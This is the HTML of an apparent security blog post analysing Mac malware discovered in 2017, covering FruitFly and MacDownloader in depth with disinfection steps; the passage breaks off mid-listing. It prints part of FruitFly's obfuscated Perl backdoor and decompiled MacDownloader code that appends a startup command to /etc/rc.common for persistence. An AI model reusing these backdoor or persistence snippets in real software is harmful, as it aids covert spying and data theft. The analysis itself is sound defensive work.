<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">

<head>
<title>Objective-See</title>

<link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:title" content="Mac Malware of 2017" />
<meta name="twitter:description" content="all the new mac malware of '17, all in one place!" />
<meta name="twitter:image" content="https://objective-see.com/images/blog/blog_0x25/twitter.png" /> 

<meta property="og:title" content="Mac Malware of 2017" />
<meta property="og:type" content="website" />
<meta property="og:image" content="https://objective-see.com/images/blog/blog_0x25/twitter.png" />


<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script> 
<script src="../js/donationPopup.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>

<script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
<script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />

<meta http-equiv="Cache-Control" content="no-store" />

</head>

<body>
<nav role="main">
<ul>
	<li><a href="../index.html" class="menubutton logo">Objective See</a></li>
	<li><a href="../about.html" class="menubutton about">about</a></li>
	<li><a href="../blog.html" class="menubutton blog visited">blog</a></li>
	<li><a href="../malware.html" class="menubutton malware">malware</a></li>
	<li><a href="../products.html" class="menubutton products">products</a></li>
</ul>
</nav>

<div class="pageContent">
	<hr class="gradient">
	<br>
	<section class="blogContent">
		<div class="blogTitle">Mac Malware of 2017</div>
		<div class="blogSubTitle">&rsaquo; a comprehensive analysis of the new mac malware of '17</div>
		<!--<div class="blogDate">1/1/2018</div>-->

		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts? support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a> :)
		<br><br>
		<span>
		<a class="inlineLink" href="https://www.patreon.com/objective_see">
			<img src="../patreon/images/patreon.jpg" width="700" style="display:block; margin:auto;"/>
		</a>
		</span>
		<br>
		</span>
		</div>
		<br>

		<br>
		<span style="color: #95c02d; font-weight: bold;">Introduction</span><br>
		Hooray, it's almost the new year! 2018 is going to be incredible, right? ...right?
		<br>
		<br> 
		For the second year in a row, I've decided to post a blog that comprehensively covers all the new Mac malware that appeared during the course of the year. While the specimens may have been briefly reported on before (i.e. by the AV company that discovered them), this blog aims to cumulatively cover all new Mac malware of 2017 - in one place. For each, we'll dive into various technical details such as identifying the malware's infection vector, persistence mechanism, features &amp; goals, and describe how to clean an infected system.
		<br>
		<br>
		This year, I've decided to start 'early' and add one or two malware specimens each day, until the blog post is complete. So check back each day, or <a class="inlineLink" href="https://twitter.com/objective_see">follow Objective-See</a> on twitter for updates!
		<br><br>
		By the way, if you want to play along, all samples can be downloaded from Objective-See's malware <a class="inlineLink" href="https://objective-see.com/malware.html">page</a>.
		<br>
		<br>
		<div style="border: 1px solid #FF6666; padding: 10px;">
		By downloading the samples, you waive all rights to claim punitive, incidental and consequential damages resulting from mishandling or self-infection!
		<br><br>
		Also, the 'disinfection' instructions provided in this blog are specific to each malware specimen. Often malware can install other malware, or allow an remote attacker to do what ever they want. Thus if you were/are infected by any of these samples, it's suggested you fully <a class="inlineLink" href="https://support.apple.com/en-us/HT204904 ">re-install macOS</a>.
		</div>
		<br>
		<br>

		<span style="color: #95c02d; font-weight: bold;">Timeline</span>
    	<ul class="timeline">
        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/fruitfly.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#FruitFly">FruitFly</a></h4>
              <p><small class="text-muted">1/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A fully-featured backdoor, designed to perversely spy on Mac users</p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/macDownloader.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#MacDownloader">MacDownloader (iKitten)</a></h4>
              <p><small class="text-muted">2/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>Iranian macOS exfiltration agent, targeting the 'defense industrial base' and human rights advocates.
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/empyre.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#Empyre">Macro'd Word Doc (w/ Empyre)</a></h4>
              <p><small class="text-muted">2/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>The open-source macOS backdoor, 'Empye', maliciously packaged into a macro'd Word document</p>
            </div>
          </div>
        </li>
       
       	<li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/proton.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#Proton">Proton</a></h4>
              <p><small class="text-muted">2/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A fully-featured macOS backdoor, designed to collect and exfiltrate sensitive user data such as 1Password files, browser login data, and keychains.
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/xagent.png" width="32" style="padding-top: 12px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#XAgent">XAgent</a></h4>
              <p><small class="text-muted">2/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>APT28's second-stage persistent macOS backdoor.</p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/fileCoder.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#FileCoder">FileCoder (FindZip/Patcher)</a></h4>
              <p><small class="text-muted">2/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A barely functional piece of macOS ransomware, written in Swift.
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/dok.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#Dok">Dok</a></h4>
              <p><small class="text-muted">4/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A banking trojan that that redirects an infected user's web traffic in order to extract banking credentials. </p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/snake.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#Snake">Snake</a></h4>
              <p><small class="text-muted">5/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A port of a highly sophisticated Windows backdoor, currently the Mac version appears incomplete and lacking features...for now!
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/macSpy.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#MacSpy">MacSpy</a></h4>
              <p><small class="text-muted">6/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>Standard macOS backdoor, offered via a 'malware-as-a-service' model.</p>
            </div>
          </div>
        </li>
       
       	<li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/fileCoder.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#MacRansom">MacRansom</a></h4>
              <p><small class="text-muted">6/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A basic piece of macOS ransomware, offered via a 'malware-as-a-service' model.
			     </p>
            </div>
          </div>
        </li>

        
        <li>
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/pwnet.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#Pwnet">Pwnet</a></h4>
              <p><small class="text-muted">8/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A crypto-currency miner, distributed via a trojaned 'CS-GO' hack.</p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x25/cpuMeaner.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title"><a class="inlineLink" href="#CpuMeaner">CpuMeaner</a></h4>
              <p><small class="text-muted">11/2017</small></p>
            </div>
            <div class="timeline-body">
              <p>A macOS crypto-currency mining trojan.</p>
            </div>
          </div>
        </li>

    </ul>


    <br>
 	<span style="color: #95c02d; font-weight: bold;"><a id="FruitFly"></a>OSX/FruitFly:</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/fruitfly.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  FruitFly
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">January, by MalwareBytes</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">unknown</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">perversely spy on users</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch agent</td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;">

	  	<ul style="list-style-type:square">
			  <li><a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/">"New Mac backdoor using antiquated code"</a> (MalwareBytes)</li>
			  <li><a class="inlineLink" href="https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf">"Dissecting OSX/FruitFly.B via a custom C&amp;C server"</a> (P. Wardle)</li>
		  </ul>
	  	
	  </td>
	</tr>
	</tbody>
	</table>
	<br>
  	OSX/FruitFly, the first Mac malware discovered in 2017, was designed to stealthily spy on 'everyday' Mac users via their webcams. Due its longevity and perverse goals it was covered extensively in the media (e.g. see: <a class="inlineLink" href="https://motherboard.vice.com/en_us/article/zmv79w/mysterious-mac-malware-has-infected-hundreds-of-victims-for-years">'Mysterious Mac Malware Has Infected Victims for Years'</a>).
  	<br>
  	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection vector:</span>
	</div>
  	The infection vector for FruitFly was never uncovered. However due to ongoing research and law-enforcement involvement, hopefully the mechanism by which the malware infected Mac users will eventually be revealed. In the meantime, it seems plausible that the malware may have infected users via common infection vectors such as email, trojanized applications, or malicious ads/popups (that trick users into downloading &amp; executing the malware):

  	<br><br>
		<span><img src="../images/blog/blog_0x25/ffInfect.png" width="600" style="display:block; margin:auto;"/></span>
	<br>

	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
	What is known, is that FruitFly persists a launch agent. Specifically it creates a property list (plist) file in <span class="n3rdFont">~/Library/LaunchAgents/</span> directory. For variant 'A', this file is named <span class="n3rdFont">com.client.client.plist</span>:
	<br>
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat ~/Library/LaunchAgents/com.client.client.plist<br>
	<br>
	&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>
	&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot;&gt;<br>
	&lt;plist version=&quot;1.0&quot;&gt;<br>
	&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;KeepAlive&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;true/&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;Label&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;string&gt;com.client.client&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;array&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;string&gt;<b>/Users/user/.client</b>&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;/array&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;<b>RunAtLoad</b>&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;<b>&lt;true/&gt;</b><br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;NSUIElement&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;string&gt;1&lt;/string&gt;<br>
	&lt;/dict&gt;<br>
	&lt;/plist&gt;<br>
	</span>
	</div>
	<br>
	As the plist sets the <span class="n3rdFont">RunAtLoad</span> key set to <span class="n3rdFont">true</span>, macOS will automatically execute whatever is specified in the <span class="n3rdFont">ProgramArguments</span> key whenever the user log in. In the case of FruitFly this is backdoor's main component: <span class="n3rdFont">/Users/user/.client</span>. (Note: for variant 'B', the file is named <span class="n3rdFont">'fpsaud'</span>).
	<br>
	<br>
	By using a tool such as <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a>, which displays persistently installed software, it's trivial to reveal FruitFly's persistent component (here; OSX/FruitFly.B's <span class="n3rdFont">'fpsaud'</span>):
	<br><br>
		<span><img src="../images/blog/blog_0x25/ffPersist.png" width="800" style="display:block; margin:auto;"/></span>
	<br>

	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
  		<span style="vertical-align:middle">features:</span>
	</div>
	The main component of OSX/FruitFly is an obfuscated perl script:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat fpsaud<br>
	<br>
	#!/usr/bin/perl
	use strict;use warnings;use IO::Socket;use IPC::Open2;my$l;sub G{die if!defined syswrite$l,$_[0]}sub J{my($U,$A)=('','');while($_[0]&gt;length$U){die if!sysread$l,$A,$_[0]-length$U;$U.=$A;}return$U;}sub O{unpack'V',J 4}sub N{J O}sub H{my$U=N;$U=~s/\\/\//g;$U}sub I{my$U=eval{my$C=`$_[0]`;chomp$C;$C};$U=''if!defined$U;$U;}sub K{$_[0]?v1:v0}sub Y{pack'V',$_[0]}sub B{pack'V2',$_[0]/2**32,$_[0]%2**32}sub Z{pack'V/a*',$_[0]}sub M{$_[0]^(v3 x length($_[0]))}my($h,@r)=split/a/,M('11b36-301-;;2-45bdql-lwslk-hgjfbdql...
	</span>
	</div>
	<br>
	Reverse-engineering this script (which also contains an embedded mach-O binary), would have been a rather time consuming process. Thus I decided to simply create a custom command &amp; control server in order to coerce the malware to reveal it's capabilities simply by tasking! If you want to learn more about this, check out the lengthy <a class="inlineLink" href="https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf">whitepaper</a> I wrote, or <a class="inlineLink" href="https://www.youtube.com/watch?v=q7VZtCUphgg">watch</a> my DefCon talk on the topic:
	<br> 
	<br>
	<iframe width="800px" height="600" src="https://www.youtube.com/embed/q7VZtCUphgg" frameborder="0" allowfullscreen></iframe>
	<br>
	<br>
	Besides standard backdoor features such as remote access to the file system, system commands and the webcam (variant 'A'), using this analysis technique revealed that the malware would generate and exfiltrate screen captures (as PNGs):
	<br><br>
		<span><img src="../images/blog/blog_0x25/ffScreenCapt.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	Via a custom mouse and keyboard sniffer I wrote (and <a class="inlineLink" href="https://github.com/objective-see/sniffMK">open-sourced on GitHub</a>) for this analysis, we can also see that FruitFly affords a remote attacker the ability to generate both simulated mouse and keyboard events. AFAIK, this is first time such a capability has been (publicly) seen in Mac malware!

	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	# ./sniffMK<br>
	<br>
	event: kCGEventKeyDown<br>
	keycode: 0/0/a<br>
	<br>
	event: kCGEventKeyUp<br>
	keycode: 0/0/a<br>
	<br>
	event: kCGEventKeyDown<br>
	keycode: 0xb/11/b<br>
	<br>
	event: kCGEventKeyUp<br>
	keycode: 0xb/11/b<br>
	<br>
	event: kCGEventKeyDown<br>
	keycode: 0x8/8/c<br>
	<br>
	event: kCGEventKeyUp<br>
	keycode: 0x8/8/c<br>
	<br>
	event: kCGEventLeftMouseDown<br>
	(x: 640.230469, y: 624.195312)<br>
	<br>
	event: kCGEventLeftMouseUp<br>
	(x: 640.230469, y: 624.195312)<br>
	</span>
	</div>
	<br>
	The full list of capabilities of OSX/FruitFly.B -revealed via tasking from the custom command &amp; control server- are shown below:
	<br><br>
		<span><img src="../images/blog/blog_0x25/ffCapabilities.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	<br>
	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
  		<span style="vertical-align:middle">disinfection:</span>
	</div>
	Known variants of OSX/FruitFly can be removed from an infected system, via the following steps:
	<ol>
		<li>Unload the malware's persistent launch agent via the <span class="n3rdFont">'launchctl unload'</span> command:
			<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
			<span class="n3rdFont">
			$ launchctl unload ~/Library/LaunchAgents/com.client.client.plist<br>
			</span>
			</div>

		</li>
		<br>
		<li>Remove the malicious launch agent plist file <span class="n3rdFont">~/Library/LaunchAgents/com.client.client.plist</span></li>
		<br>
		<li>Remove the malware's persistent perl script &amp; file. Depending on the variant, this file may be:<br> <span class="n3rdFont">~/.client</span> or <span class="n3rdFont">~/fpsaud</span></li>
	</ol>
	<br>
	<span style="color: #95c02d; font-weight: bold;"><a id="MacDownloader"></a>OSX/MacDownloader (iKitten):</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/macDownloader.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  MacDownloader (iKitten)
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">February, by Claudio Guarnieri/Collin Anderson ('Iran Threats')</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">fake Adobe Flash player</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">exfiltration of user data, such as keychain</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove malicious app (persistence code is broken)</td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;"><a class="inlineLink" href="https://iranthreats.github.io/resources/macdownloader-macos-malware/">"iKittens: Iranian Actor Resurfaces With Malware For Mac"</a> (Iran Threats)</td>
	</tr>
	</tbody>
	</table>
	<br>
  	OSX/MacDownloader is a simple (incomplete?) macOS exfiltration agent, tied to Iranian offensive cyber operations. In their writeup, <a class="inlineLink" href="https://iranthreats.github.io/resources/macdownloader-macos-malware/">"iKittens: Iranian Actor Resurfaces With Malware For Mac"</a>, Claudio Guarnieri and Collin Anderson provide a comprehensive analysis of the malware.
  	<br>
  	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection:</span>
	</div>
	As noted by Claudio and Collin, MacDownloader infections begin with a phishing email. Specifically they state, "An active staging of the MacDownloader agent was first observed linked out from a site impersonating the aerospace firm "United Technologies Corporation," a spearphishing site was previously believed to be maintained by Iranian actors for spreading Windows malware." Below is a screen shot of the malicious site (image credit: Claudio/Collin):
	<br><br>
		<span><img src="../images/blog/blog_0x25/macDownloaderPhish.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	As can be seen, the site contains a link to what purports to be a required plugin for the video player; Adobe Flash. Of course, this links not to a legitimate version of Flash, but "either Windows or Mac malware based on the detected operating system." If the user is tricked into running and downloading the 'flash player' application, they'll become infected with MacDownloader:
	<br><br>
		<span><img src="../images/blog/blog_0x25/macDownloaderInstall.png" width="734" style="display:block; margin:auto;"/></span>
	<br> 
	It should be noted though, that the malicious application (<span class="n3rdFont">addone flashplayer.app</span>) is unsigned. As such, Gatekeeper should block the malware from executing - unless the user disables it, or explicitly agrees to allow the unsigned malicious code to execute.
	<br><br>
		<span><img src="../images/blog/blog_0x25/macDownloaderUnsigned.png" width="692" style="display:block; margin:auto;"/></span>
	<br> 
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
  	The security researchers who discovered and analyzed the application note that, "it appears that the application contains an unused attempt to install persistent access to the victim host." Digging into the code, we can find a method named <span class="n3rdFont">addToStartup</span> that will persist the malware by modifying the the <span class="n3rdFont">/etc/rc.common</span> file, adding a command to execute something named <span class="n3rdFont">/etc/.checkdev</span>

  	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
			-[AppDelegate addToStartup:](void * self, void * _cmd, void * arg2) { <br>
    		<br>
			&nbsp;&nbsp;&nbsp;rax = [0x0 lastPathComponent];<br>
    		&nbsp;&nbsp;&nbsp;rax = [rax retain];<br>
    		&nbsp;&nbsp;&nbsp;var_20 = [NSString stringWithFormat:@"if cat /etc/rc.common | grep %@; then sleep 1; <br>
    		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else echo 'sleep %d &amp;&amp; %@ &amp;' >> <b>/etc/rc.common</b>; fi ", rax, 0x78, 0x0];<br>
    		&nbsp;&nbsp;&nbsp;[[[CUtils ExecuteBash:var_20] retain] release];<br>
    		&nbsp;&nbsp;&nbsp;...<br>
			}
		</span>
		</div>
	<br>
	In 2014 wrote a paper titled, <a class="inlineLink" href="https://www.virusbulletin.com/pdf/conference/vb2014/VB2014-Wardle.pdf">"Methods of Malware Persistence on OS X"</a>, where I discussed using <span class="n3rdFont">/etc/rc.common</span> for persistence, noting: 
	
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
			"<i>RC scripts are used in another BSD-flavoured persistence technique that works on OS X, allowing scripts or commands to automatically be executed. For example, the rc.common file can be edited to insert arbitrary commands that will automatically execute when OS X starts.</i>"
		</span>
	</div>
	<br>
	It's kind of neat to see a piece of mac malware (ab)using this method for persistence! 
	<br>
	<br>
	Good news though, <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a>, which displays persistently installed software, can detect that the <span class="n3rdFont">rc.common</span> file has been maliciously modified:
	<br><br>
		<span><img src="../images/blog/blog_0x25/macDownloaderPersist.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	<br>
	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
  		<span style="vertical-align:middle">features:</span>
	</div>
	The main goal of OSX/MacDownloader is to survey and collect/exfiltrate sensitive data from an infected target. Claudio/Collin state:
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
			"<i>MacDownloader harvests information on the infected system, including the user's active Keychains, which are then uploaded to the C2. The dropper also documents the running processes, installed applications, and the username and password which are acquired through a fake System Preferences dialog.</i>"
		</span>
	</div>
	<br>
	During install, the malware displays a fake authentication prompt to collect the user's credentials. Assuming the user is running in the default context of an administrator account, this will give the malware the ability to perform privileged actions as well as unlock encrypted data in the user's keychain:
	<br><br>
		<span><img src="../images/blog/blog_0x25/macDownloaderAuth.png" width="427" style="display:block; margin:auto;"/></span>
	<br>
	Dumping the Objective-C class information via <a class="inlineLink" href="http://www.newosxbook.com/tools/jtool.html"<span class="n3rdFont">jtool</span></a>, we see methods responsible for the collection:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ ./jtool -d objc -v "addone flashplayer.app/Contents/MacOS/Bitdefender Adware Removal Tool"<br>
	<br>
	@interface AuthenticationController : <br>
	// 11 instance methods<br>
	/* 0 - 0x1000049b0 */ - getLocalIPAddress;<br>
	/* 1 - 0x100004fd0 */ - getRunningProcessList;<br>
	/* 2 - 0x100005380 */ - getInstalledApplicationsList;<br>
	/* 3 - 0x1000059b0 */ - getKeychainsFilePath;<br>
	...<br>
	</span>
	</div>
	<br>
	Taking a closer look at the <span class="n3rdFont">'getRunningProcessList'</span> method reveals the malware simple invokes the <span class="n3rdFont">[NSWorkspace sharedWorkspace]</span>'s '<span class="n3rdFont">runningApplications</span>' method:
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		-[AuthenticationController getRunningProcessList](void * self, void * _cmd) {<br>
    	&nbsp;&nbsp;&nbsp;var_A0 = [[NSMutableArray alloc] init];<br>
		&nbsp;&nbsp;&nbsp;rax = [NSWorkspace sharedWorkspace];<br>
		&nbsp;&nbsp;&nbsp;var_A8 = [[rax runningApplications] retain];<br>
    	&nbsp;&nbsp;&nbsp;<br>
    	&nbsp;&nbsp;&nbsp;rax = [rax countByEnumeratingWithState:var_F0 objects:var_88 count:0x10];<br>
    	<br>
    	&nbsp;&nbsp;&nbsp;do {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_F8 = [[NSString stringWithFormat:@"process name is: %@\t PID: %d<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run from: %@", var_150, var_154, rax] retain];<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[var_A0 addObject:var_F8];<br>
        <br>
		</span>
		</div>
	<br>
	It should be noted that this method simply returns a list of applications running in the context of the user...not all running processes!
	<br>
	<br>
	The malware saves survey information, user credentials, installed apps, and running applications in a file name <span class="n3rdFont">/tmp/applist.txt</span>:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat /tmp/applist.txt<br>
	"OS version: Darwin users-Mac.local 16.7.0 Darwin Kernel Version 16.7.0: Thu Jun 15 17:36:27 PDT 2017; root:xnu-3789.70.16~2\/RELEASE_X86_64 x86_64",<br>
 	 "Root Username: \"user\"",<br>
  	 "Root Password: \"hunter2\"",<br>
  	 ...<br>
  	 [<br>
    "Applications\/App%20Store.app\/",<br>
    "Applications\/Automator.app\/",<br>
    "Applications\/Calculator.app\/",<br>
